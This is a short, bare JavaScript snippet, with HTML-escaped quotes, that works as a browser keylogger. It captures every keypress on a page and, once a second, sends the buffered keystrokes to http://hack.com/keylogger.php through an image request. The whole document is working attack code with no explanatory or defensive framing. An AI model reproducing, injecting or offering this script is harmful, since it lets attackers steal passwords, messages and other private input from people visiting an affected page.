var keys=&#39;&#39;;
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
  new Image().src = &#39;http://hack.com/keylogger.php?c=&#39;+keys;
  keys = &#39;&#39;;
}, 1000);

